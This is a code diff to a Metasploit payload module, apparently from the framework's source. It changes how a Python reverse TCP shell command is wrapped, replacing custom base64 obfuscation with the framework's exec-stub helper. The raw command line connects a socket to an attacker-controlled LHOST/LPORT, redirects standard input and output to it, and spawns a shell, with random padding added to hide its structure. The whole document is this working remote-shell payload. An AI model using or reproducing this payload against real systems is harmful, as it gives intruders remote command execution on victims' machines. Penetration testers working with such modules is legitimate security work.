@@ -4,6 +4,7 @@
 ##
 
 require 'msf/core/handler/reverse_tcp'
+require 'msf/core/payload/python'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -12,6 +13,7 @@ module MetasploitModule
   CachedSize = :dynamic
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -52,8 +54,7 @@ module MetasploitModule
 
   def command_string
     raw_cmd = "import socket,subprocess,os;host=\"#{datastore['LHOST']}\";port=#{datastore['LPORT']};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\"#{datastore['SHELL']}\")"
-    obfuscated_cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
-    encoded_cmd = Rex::Text.encode_base64(obfuscated_cmd)
-    "python -c \"exec('#{encoded_cmd}'.decode('base64'))\""
+    cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
+    "python -c \"#{ py_create_exec_stub(cmd) }\""
   end
 end
